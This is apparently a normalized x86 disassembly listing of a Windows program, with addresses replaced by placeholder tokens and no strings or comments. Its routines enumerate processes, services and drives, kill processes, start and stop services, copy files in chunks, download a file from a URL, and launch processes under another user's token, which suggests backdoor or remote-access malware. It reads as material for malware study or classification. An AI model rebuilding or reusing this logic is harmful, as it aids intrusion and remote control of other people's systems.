mov eax [ esp + 0x14 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
lea edx [ esp + 0x94 ]
push 0x0
push edx
push 0x0
push eax
call [ CreateProcessAsUserA@IAT ]
test eax eax
je r-xdata
push ebp
call [ CloseHandle@IAT ]
jmp r-xdata
push ebp
mov [ rw-data ] 0x1
call [ CloseHandle@IAT ]
jmp r-xdata
sub_4022b0
mov eax [ rw-data ]
sub esp 0x23c
test eax eax
push ebx
push ebp
push esi
push edi
jne r-xdata
mov esi [ _strcmpi@IAT ]
push eax
push rw-data
call esi
add esp 0x8
test eax eax
jne r-xdata
mov edi rw-data
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push rw-data
call esi
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x4a
lea edi [ esp + 0x124 ]
push eax
push 0x2
[ edi ]
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x250 ]
mov edx ecx
jmp r-xdata
mov eax [ rw-data ]
push eax
push rw-data
call esi
add esp 0x8
test eax eax
jne r-xdata
push 0x4
push eax
push eax
call [ OpenSCManagerA@IAT ]
mov ebx eax
test ebx ebx
mov [ esp + 0x20 ] ebx
jne r-xdata
lea eax [ esp + 0x124 ]
mov [ esp + 0x124 ] 0x128
push eax
push ebx
call Process32First
test eax eax
je r-xdata
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x23c
retn
mov [ esp + 0x14 ] eax
call [ GetLogicalDrives@IAT ]
lea ecx [ esp + 0x24 ]
push rw-data
push ecx
mov [ esp + 0x18 ] eax
mov bl 0x41
call [ sprintf@IAT ]
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
mov ebp [ esp + 0x250 ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
mov ecx edx
and ecx 0x3
test eax eax
[ edi ] [ esi ]
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push 0x0
lea ecx [ esp + 0x1c ]
mov ebp [ EnumServicesStatusExA@IAT ]
push eax
push ecx
push 0x0
push 0x0
push 0x1
push 0x30
push 0x0
push ebx
call ebp
mov edx [ esp + 0x14 ]
lea edi [ edx + 0x1 ]
push edi
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x18 ] esi
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x250 ]
mov edx ecx
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x23c
retn
mov ebp [ esp + 0x250 ]
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x24 ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
test al 0x1
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push 0x0
lea ecx [ esp + 0x1c ]
push eax
push ecx
push edi
push esi
push 0x1
push 0x30
push 0x0
push ebx
call ebp
mov eax [ esp + 0x10 ]
xor ebp ebp
test eax eax
jbe r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov edi rw-data
mov ecx [ esp + 0x12c ]
lea edx [ esp + 0x148 ]
push ecx
push edx
lea eax [ esp + 0x2c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea edi [ esp + 0x34 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x124 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
call Process32Next
test eax eax
jne r-xdata
shr eax 0x1
inc bl
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
movsx eax bl
push eax
lea ecx [ esp + 0x28 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x19 ] al
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x18 ]
and ecx 0x3
push rw-data
[ edi ] [ esi ]
push eax
mov [ esp + 0x20 ] bl
call [ lstrcatA@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
call [ GetDriveTypeA@IAT ]
cmp eax 0x6
ja r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
push ebx
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x23c
retn
mov ebx esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x138 ]
push 0x105
lea ecx [ esp + 0x30 ]
push eax
push ecx
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_402714 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
push edx
push eax
lea ecx [ esp + 0x2c ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x34 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
add ebx 0x2c
mov esi edi
mov edi [ esp + 0x250 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
mov ecx edx
and ecx 0x3
inc ebp
cmp ebp eax
[ edi ] [ esi ]
jb r-xdata
mov ebx [ esp + 0x20 ]
mov esi [ esp + 0x18 ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov ecx edx
and ecx 0x3
inc eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x10 ]
[ edi ] [ esi ]
lea edi [ esp + 0x124 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_402730
mov eax [ rw-data ]
sub esp 0x1c
test eax eax
push ebx
push ebp
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
mov esi [ _strcmpi@IAT ]
push eax
push rw-data
call esi
add esp 0x8
test eax eax
jne r-xdata
mov edi rw-data
jmp r-xdata
mov eax [ rw-data ]
push eax
push rw-data
call esi
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push ecx
call [ atoi@IAT ]
add esp 0x4
push eax
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x30 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
push 0x4
push eax
push eax
call [ OpenSCManagerA@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
mov edi [ esp + 0x30 ]
push 0x1
push esi
call [ TerminateProcess@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0xf003f
push eax
push ebp
call [ OpenServiceA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
test edi edi
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push 0x1
push ebx
call [ ControlService@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x424
mov edi rw-data
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x426
mov edi rw-data
je r-xdata
mov eax [ esp + 0x14 ]
dec eax
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebp
mov esi edi
mov edi [ esp + 0x34 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x30 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edi rw-data
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi rw-data
jmp r-xdata
dec eax
jne r-xdata
mov esi [ CloseServiceHandle@IAT ]
push ebx
call esi
push ebp
call esi
mov edi rw-data
jmp r-xdata
sub_402900
push 0xffffffff
push sub_4043ab
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x280
push esi
push edi
push 0xea60
push 0x1
push rw-data
push rw-data
xor esi esi
push rw-data
push rw-data
lea ecx [ esp + 0x34 ]
mov [ esp + 0x28 ] esi
call sub_401020
mov eax [ rw-data ]
mov [ esp + 0x290 ] esi
cmp eax esi
jne r-xdata
push ebx
push ebp
push 0x200c8
call ??2@YAPAXI@Z
mov ebp eax
add esp 0x4
cmp ebp esi
mov ebx ebp
mov [ ebp ] 0x0
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x290 ] 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x298 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x1c ]
call sub_401090
xor eax eax
jmp r-xdata
mov eax [ esp + 0x1c ]
pop ebp
cmp eax 0xffffffff
pop ebx
je r-xdata
mov eax [ rw-data ]
push rw-data
push eax
call [ _strcmpi@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x288 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x28c
retn 0x4
lea ecx [ esp + 0x1c ]
mov [ esp + 0x290 ] 0xffffffff
call sub_401090
mov eax 0x1
push eax
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
lea esi [ esp + 0x8c ]
sub edi ecx
mov eax ecx
mov [ esp + 0x14 ] esi
mov esi edi
mov edi [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
mov [ esp + 0x18 ] 0x1
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
lea edx [ esp + 0xa0 ]
push 0x80000000
push edx
push 0x5c
push edx
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
test ebx ebx
je r-xdata
test edi edi
je r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
lea ecx [ esp + 0xa0 ]
push 0x40000000
push ecx
jmp r-xdata
lea edi [ eax + 0x1 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x8c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
push ebp
call ??3@YAXPAX@Z
add esp 0x4
lea ecx [ esp + 0x20 ]
push ecx
push eax
call [ GetFileSize@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
call [ atoi@IAT ]
add esp 0x4
mov esi eax
jmp r-xdata
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x1c ] eax
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x190 ]
push eax
push rw-data
push ecx
call [ sscanf@IAT ]
mov edx [ rw-data ]
add esp 0xc
lea ecx [ esp + 0x24 ]
push edx
call sub_4011e0
lea eax [ esp + 0x190 ]
lea ecx [ esp + 0x24 ]
push eax
call sub_401250
test edi edi
jne r-xdata
push esi
lea edx [ esp + 0x50 ]
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0xc
lea ecx [ esp + 0x24 ]
call sub_4010e0
test eax eax
je r-xdata
lea ecx [ esp + 0x4c ]
push ecx
lea ecx [ esp + 0x28 ]
call sub_401350
mov edi esi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x14 ] edi
call sub_401520
lea ecx [ esp + 0x24 ]
call sub_4010e0
test eax eax
je r-xdata
lea ecx [ esp + 0x24 ]
call sub_401520
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x0
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push ebp
lea ecx [ esp + 0x2c ]
call sub_4013c0
mov esi eax
test esi esi
je r-xdata
cmp edi 0x20000
mov eax 0x20000
jg r-xdata
test edi edi
jle r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push 0x0
push edx
sub edi eax
push eax
mov eax [ esp + 0x28 ]
push ebp
push eax
mov [ esp + 0x28 ] edi
call [ ReadFile@IAT ]
mov eax edi
test esi esi
je r-xdata
cmp edi 0x20000
jle r-xdata
lea ecx [ esp + 0x24 ]
call sub_401520
lea ecx [ esp + 0x24 ]
call sub_4010e0
test eax eax
jne r-xdata
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x24 ]
push edx
push edi
push ebp
call sub_4014d0
push rw-data
push ebp
mov esi eax
call [ strstr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov edi 0x20000
mov ecx [ esp + 0x10 ]
cmp ecx 0x3
jbe r-xdata
test esi esi
je r-xdata
cmp [ eax + ebp ] 0xd
jne r-xdata
mov edx [ esp + 0x14 ]
mov ebx ebp
sub edx edi
test ecx ecx
mov [ esp + 0x14 ] edx
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push eax
mov edi ecx
push ecx
mov ecx [ esp + 0x28 ]
push ebx
push ecx
call [ WriteFile@IAT ]
mov ecx [ esp + 0x10 ]
inc eax
lea edx [ eax + 0x3 ]
cmp edx ecx
jb r-xdata
cmp [ eax + ebp + 0x1 ] 0xa
jne r-xdata
mov edi [ esp + 0x14 ]
test esi esi
jne r-xdata
jmp r-xdata
cmp [ eax + ebp + 0x2 ] 0xd
jne r-xdata
cmp [ eax + ebp + 0x3 ] 0xa
je r-xdata
lea edx [ eax + 0x4 ]
cmp edx ecx
jne r-xdata
mov edx 0xfffffffc
mov [ ecx + ebp ] 0x0
mov ecx [ esp + 0x10 ]
sub edx eax
add ecx edx
lea ebx [ eax + ebp + 0x4 ]
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov [ esp + 0x10 ] ecx
jmp r-xdata
sub_402d10
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
push edi
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov edi [ esp + 0x18 ]
not ecx
dec ecx
mov [ esp + 0x14 ] ecx
mov ecx edi
call sub_401520
mov ebp [ Sleep@IAT ]
xor esi esi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x1c ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
push rw-data
call sub_401cd0
mov ecx [ rw-data ]
add esp 0x8
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ rw-data ] 0x0
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov ecx edi
push eax
push ebx
call sub_4013c0
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx edi
call sub_401520
push 0xea60
inc esi
call ebp
cmp esi 0x5
jb r-xdata
mov ecx edi
call sub_4010e0
test eax eax
jne r-xdata
sub_402e20
mov eax [ rw-data ]
sub esp 0x54
test eax eax
push ebx
push ebp
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
mov esi [ _strcmpi@IAT ]
push eax
push rw-data
call esi
add esp 0x8
test eax eax
jne r-xdata
mov edi rw-data
jmp r-xdata
mov edx [ rw-data ]
push edx
push rw-data
call esi
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x11
lea edi [ esp + 0x20 ]
[ edi ]
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x20 ]
push ecx
push edx
push eax
push eax
push eax
push 0x1
push eax
mov [ esp + 0x6c ] ax
push eax
mov eax [ rw-data ]
push eax
push 0x0
mov [ esp + 0x48 ] 0x44
mov [ esp + 0x74 ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
mov edi rw-data
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x68 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
push 0x4
push eax
push eax
call [ OpenSCManagerA@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x68 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
mov esi [ CloseHandle@IAT ]
call esi
mov ecx [ esp + 0x14 ]
push ecx
call esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
mov edi rw-data
mov eax [ rw-data ]
push 0xf003f
push eax
push ebp
call [ OpenServiceA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov edi rw-data
push 0x0
push 0x0
push ebx
call [ StartServiceA@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x424
mov edi rw-data
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x420
mov edi rw-data
je r-xdata
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebp
mov esi edi
mov edi [ esp + 0x6c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov edi [ esp + 0x6c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ CloseServiceHandle@IAT ]
call esi
push ebp
call esi
mov edi rw-data
sub_403020
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0xc ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call [ atol@IAT ]
mov ecx [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
push ecx
call sub_4030e0
add esp 0x10
retn
sub_403080
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0xc ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x0
push eax
push ecx
push 0x0
call URLDownloadToFileA
retn
sub_4030e0
sub esp 0x260
mov eax [ esp + 0x26c ]
push ebp
push esi
xor esi esi
cmp eax esi
push edi
mov [ esp + 0x10 ] esi
jne r-xdata
push eax
push esi
push 0x1f0fff
call [ OpenProcess@IAT ]
call [ GetCurrentProcess@IAT ]
jmp r-xdata
lea eax [ esp + 0xc ]
push ebx
push eax
push 0xb
push ebp
call [ OpenProcessToken@IAT ]
mov ebx [ CloseHandle@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ esp + 0x6c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea edi [ esp + 0x74 ]
or ecx ebp
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x270 ]
mov edx ecx
or ecx ebp
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
add esp 0x260
retn
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
call [ GetLastError@IAT ]
push eax
lea ecx [ esp + 0x70 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x78 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
push ebp
mov esi edi
mov edi [ esp + 0x278 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call ebx
mov eax [ esp + 0x14 ]
pop ebx
pop edi
pop esi
pop ebp
add esp 0x260
retn
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x28 ]
lea edx [ esp + 0x16c ]
[ edi ]
mov ecx [ esp + 0x278 ]
mov edi [ sprintf@IAT ]
push ecx
push rw-data
push edx
mov [ esp + 0x34 ] 0x44
mov [ esp + 0x60 ] 0x1
mov [ esp + 0x64 ] si
call edi
add esp 0xc
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0x16c ]
push eax
mov eax [ esp + 0x14 ]
push ecx
push esi
push esi
push esi
push 0x1
push esi
push esi
push edx
push esi
push eax
call [ CreateProcessAsUserA@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
lea edx [ esp + 0x70 ]
push rw-data
push edx
call edi
lea edi [ esp + 0x78 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x274 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
call ebx
push ebp
call ebx
mov eax [ esp + 0x14 ]
pop ebx
pop edi
pop esi
pop ebp
add esp 0x260
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x274 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
call ebx
mov ecx [ esp + 0x1c ]
push ecx
call ebx
mov eax [ esp + 0x10 ]
mov [ esp + 0x14 ] 0x1
push eax
call ebx
push ebp
call ebx
mov eax [ esp + 0x14 ]
pop ebx
pop edi
pop esi
pop ebp
add esp 0x260
retn
sub_403310
sub esp 0x2c0
push ebx
push edi
push 0x1210
mov [ esp + 0x18 ] 0x0
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ecx 0x484
xor eax eax
mov edi ebx
push rw-data
push 0x1
push eax
[ edi ]
call [ CreateMutexA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x18 ] eax
je r-xdata
pop edi
pop ebx
add esp 0x2c0
retn 0x10
push ebp
lea eax [ esp + 0xc ]
push esi
push eax
push ebx
mov [ esp + 0x18 ] 0x100
call [ GetUserNameA@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
lea eax [ esp + 0x10 ]
lea ebp [ ebx + 0x100 ]
push eax
push ebp
mov [ esp + 0x18 ] 0x10
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
xor eax eax
pop ebx
add esp 0x2c0
retn 0x10
mov edi [ Sleep@IAT ]
push 0x2710
call edi
mov [ esp + 0x14 ] 0x0
call [ GetCurrentProcess@IAT ]
mov ebp eax
lea eax [ esp + 0x1cc ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
push 0xf01ff
push ebp
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
lea eax [ esp + 0xc8 ]
push edx
push eax
push ecx
mov [ esp + 0x1c ] 0x104
call [ GetUserProfileDirectoryA@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
push 0x2710
call edi
test esi esi
je r-xdata
push ebp
call [ CloseHandle@IAT ]
mov eax [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc8 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0xc8 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x1d0 ]
push ecx
call [ _strcmpi@IAT ]
mov esi eax
add esp 0x8
neg esi
sbb esi esi
neg esi
je r-xdata
lea edx [ esp + 0x34 ]
mov [ esp + 0x34 ] 0x94
push edx
call [ GetVersionExA@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
cmp ebp 0xffffffff
je r-xdata
mov eax [ esp + 0x18 ]
